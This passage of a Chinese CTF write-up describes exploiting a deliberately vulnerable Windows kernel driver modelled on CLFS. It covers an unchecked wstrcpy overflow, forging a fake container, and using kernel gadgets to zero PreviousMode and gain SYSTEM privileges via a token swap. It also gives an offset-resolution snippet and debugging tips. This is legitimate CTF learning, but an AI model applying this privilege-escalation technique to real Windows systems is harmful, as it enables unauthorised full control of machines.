</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> ullAlignment;
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbPrevOffset;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbNextOffset;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>remove container</p>
<ul>
<li>修改了 <code>cbNextOffset</code>，修改偏移 <code>cbSymbolZone</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">__declspec</span>(align(<span style="color:#bd93f9">8</span>)) removeLogContainer_parm
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>logFile;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> ContainerID;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">removeLogContainer</span>(myLOG_HEADER <span style="color:#ff79c6">*</span>logFile, <span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">int</span> ContainerID)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  my_CLFS_CONTAINER_CONTEXT <span style="color:#ff79c6">*</span>thisContainer; <span style="color:#6272a4">// [rsp+28h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  myContainer <span style="color:#ff79c6">*</span>pContainer; <span style="color:#6272a4">// [rsp+30h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( ContainerID <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> ContainerID <span style="color:#ff79c6">&gt;</span> logFile<span style="color:#ff79c6">-&gt;</span>Containers )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xFFFFFFFF</span>i64;
</span></span><span style="display:flex;"><span>  thisContainer <span style="color:#ff79c6">=</span> (my_CLFS_CONTAINER_CONTEXT <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)logFile <span style="color:#ff79c6">+</span> logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[ContainerID]);
</span></span><span style="display:flex;"><span>  pContainer <span style="color:#ff79c6">=</span> thisContainer<span style="color:#ff79c6">-&gt;</span>pContainer;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( pContainer )
</span></span><span style="display:flex;"><span>    myContainer<span style="color:#ff79c6">::</span>`scalar deleting destructor&#39;(pContainer, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[<span style="color:#bd93f9">46</span>] <span style="color:#ff79c6">+</span> thisContainer<span style="color:#ff79c6">-&gt;</span>cbNextOffset) <span style="color:#ff79c6">=</span> thisContainer<span style="color:#ff79c6">-&gt;</span>cbPrevOffset;
</span></span><span style="display:flex;"><span>  logFile<span style="color:#ff79c6">-&gt;</span>cbSymbolZone <span style="color:#ff79c6">-=</span> <span style="color:#bd93f9">0xE0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">--</span>logFile<span style="color:#ff79c6">-&gt;</span>Containers;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>closeLogFile：清空所有的container以及logfileMem</p>
<p>其大致内存结构，在一个BIGPOOL中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>myLOG_HEADER           大小<span style="color:#bd93f9">0x228</span>
</span></span><span style="display:flex;"><span>	cbSymbolZone 表示可用内存的起始地址
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>注册一个container 最多可以注册<span style="color:#bd93f9">128</span>个 my_CLFS_CONTAINER_CONTEXT <span style="color:#bd93f9">0xe0</span>
</span></span><span style="display:flex;"><span>	pContainer <span style="color:#bd93f9">0x18</span> myContainer 结构体
</span></span><span style="display:flex;"><span>	cbPrevOffset 记录前一个 container 起始地址偏移
</span></span><span style="display:flex;"><span>	cbNextOffset 记录后一个起始地址偏移
</span></span></code></pre></div><p>这个<code>wstrcpy</code>溢出写，containerName 我们传入，长度随意，<code>thisContainer-&gt;containerName</code> 只有100的长度。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>wstrcpy(thisContainer<span style="color:#ff79c6">-&gt;</span>containerName, containerName, len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 函数也存在一个溢出 读/写 wchar
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">void</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">wstrcpy</span>(<span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>dst, <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>src, <span style="color:#8be9fd">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+0h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> len <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    dst[i] <span style="color:#ff79c6">=</span> src[i];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">my_CLFS_CONTAINER_CONTEXT</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> cidContainer;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> containerName[<span style="color:#bd93f9">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">union</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  myContainer <span style="color:#ff79c6">*</span>pContainer;               <span style="color:#6272a4">// new myContainer, size 0x18
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> ullAlignment;
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbPrevOffset;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbNextOffset;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>没有限制的溢出，我们查一下池的基地址，将container地址改成池中的地址，然后覆盖container地址，伪造一个container</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>logfileMem <span style="color:#ff79c6">=</span> (myLOG_HEADER <span style="color:#ff79c6">*</span>)ExAllocatePoolWithTag(NonPagedPool, <span style="color:#bd93f9">0x7228u</span>i64, <span style="color:#bd93f9">0x4C674673u</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 另一个大池，TAG不同
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">-&gt;</span>data <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)ExAllocatePool2(<span style="color:#bd93f9">64</span>i64, <span style="color:#bd93f9">0x7228</span>i64, &#39;gl3d&#39;);
</span></span></code></pre></div><h3 id="exploit">Exploit</h3>
<p>我首先尝试了使用给出的任意读写原语。</p>
<ul>
<li>多次蓝屏后意识到这根本不是 <code>strcpy</code>，而是 <code>memcpy</code> ，没有<code>\x00</code>截断</li>
<li>因此尝试读写token有点问题，长度0x200的memcpy，写入0x200 token直接蓝屏，并且接收不到内容</li>
</ul>
<p>NonPagedPool是可执行的，但是因为shellcode里存在 <code>0x0000</code> 无法直接写入全部shellcode，可以尝试ROP</p>
<p>使用了HEVD：<code>mov esp gadget</code>，直接失败了，显示访问非法内存。</p>
<p>CLFS ROP CVE 存在相关,不错的gadget: <code>RtlClearBit</code> 和 <code>SeSetAccessStateGenericMapping</code></p>
<ul>
<li><a href="https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability">Analysis of CVE-2023-28252 CLFS Vulnerability</a></li>
<li><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis">CVE-2022-37969 | Windows CLFS Zero-Day</a></li>
<li><a href="https://mas0n.org/94f74a6b0a844648b46728a89c5cbb03#d8a5fc8f50974a07b90186c2cc43115d">CVE-2022-37969</a></li>
<li><a href="https://blog.qwerdf.com/2022/11/30/CVE-2022-37969/#%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E5%8F%82%E8%80%83">CVE-2022-37969</a></li>
</ul>
<p>SeSetAccessStateGenericMapping  修改 <code>_ETHREAD._KTHREAD.PreviousMode</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> u SeSetAccessStateGenericMapping
</span></span><span style="display:flex;"><span>nt<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">SeSetAccessStateGenericMapping</span>:
</span></span><span style="display:flex;"><span>fffff800`<span style="color:#bd93f9">06e712</span>b0 <span style="color:#bd93f9">488</span>b4148        mov     rax,qword ptr [rcx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">48</span>h]
</span></span><span style="display:flex;"><span>fffff800`<span style="color:#bd93f9">06e712</span>b4 <span style="color:#bd93f9">0f</span><span style="color:#bd93f9">1002</span>          movups  xmm0,xmmword ptr [rdx]
</span></span><span style="display:flex;"><span>fffff800`<span style="color:#bd93f9">06e712</span>b7 f30f7f4008      movdqu  xmmword ptr [rax<span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>],xmm0
</span></span><span style="display:flex;"><span>fffff800`<span style="color:#bd93f9">06e712</span>bc c3              ret
</span></span></code></pre></div><p>此处rcx是pContainer，已知</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>thisContainer<span style="color:#ff79c6">-&gt;</span>pContainer<span style="color:#ff79c6">-&gt;</span>read_data(thisContainer<span style="color:#ff79c6">-&gt;</span>pContainer, data);
</span></span></code></pre></div><p><code>[rdx]</code>可以是0（用户buffer），<code>rax+8</code> 设置为<code>_ETHREAD._KTHREAD.PreviousMode</code>地址。</p>
<p>SeSetAccessStateGenericMapping偏移我实在windbg直接找，不够自动化，看CVE时发现可以使用找函数的方法来直接获得😋</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// https://github.com/fortra/CVE-2022-37969/blob/main/CVE-2022-37969-PoC.cpp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>HMODULE ntos_userBase <span style="color:#ff79c6">=</span> LoadLibraryExW(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;ntoskrnl.exe&#34;</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (ntos_userBase)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	v22a <span style="color:#ff79c6">=</span> GetProcAddress(ntos_userBase, <span style="color:#f1fa8c">&#34;SeSetAccessStateGenericMapping&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>offset_SeSetAccess <span style="color:#ff79c6">=</span> (UINT64)v22a <span style="color:#ff79c6">-</span> (UINT64)ntos_userBase;
</span></span><span style="display:flex;"><span>printf(<span style="color:#f1fa8c">&#34;[+] Offset SeSetAccessStateGenericMapping ----------&gt; %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, offset_SeSetAccess);
</span></span><span style="display:flex;"><span>fnSeSetAccessStateGenericMapping <span style="color:#ff79c6">=</span> ntos_kernelBase <span style="color:#ff79c6">+</span> offset_SeSetAccess;
</span></span></code></pre></div><p>因此最后修改 <code>PreviousMode</code> 为0，任意地址读写，修改token，提权成功。</p>
<p>代码仓库 - <a href="https://github.com/ldrx30/WP">CTF WP</a></p>
<p>使用 <code>RtlClearBit</code> 也可以构造出同样的效果 - 是将 <code>[rcx+8]</code> 地址加上 <code>edx</code> 偏移置为0，但是这个edx还是得控制一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> u nt<span style="color:#ff79c6">!</span>RtlClearBit
</span></span><span style="display:flex;"><span>nt<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">RtlClearBit</span>:
</span></span><span style="display:flex;"><span>fffff802`<span style="color:#bd93f9">1615</span>c150 <span style="color:#bd93f9">488</span>b4108        mov     rax,qword ptr [rcx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>]
</span></span><span style="display:flex;"><span>fffff802`<span style="color:#bd93f9">1615</span>c154 <span style="color:#bd93f9">0f</span>b310          btr     dword ptr [rax], edx
</span></span><span style="display:flex;"><span>fffff802`<span style="color:#bd93f9">1615</span>c157 c3              ret
</span></span></code></pre></div><h3 id="注意">注意</h3>
<p>WinDbg命令行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span>windbg.exe -k -d net:port=&lt;YourDebugPort&gt;,key=&lt;YourKey&gt;
</span></span></code></pre></div><p>需要注意 <code>ZwCreateFile</code> 访问文件 <code>C:\\Users:\\Public\\tmp.log</code> 需要是 <code>\\??\\C:\\Users\\Public\\tmp.log</code> 才能正确识别</p>
<ul>
<li>内核和用户看到的不是同一个东西</li>
<li><a href="https://www.cnblogs.com/geons/p/8685175.html">Windows内核驱动中操作文件</a></li>
</ul>
<p>传入数据时，因为wstrcpy本身存在问题，因此可能访问不能访问的页</p>
<p>比如数据填满，就会访问后面的数据。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>AAAAAAAAAA <span style="color:#ff79c6">&lt;-</span> 访问到这里时，溢出页大概率崩溃
</span></span><span style="display:flex;"><span>PAGE
</span></span></code></pre></div><p>因此我们传递参数时，buffer后面需要加一个padding <code>\x00\x00</code> 避免访问未知内存而蓝屏（因为这个改了几小时的BUG😭</p>
<p>感觉还不错，赶在结束前做出来了，有点遗憾的是做完这个之后没精力看qemu逃逸那个题目了。</p>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/windows">Windows</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
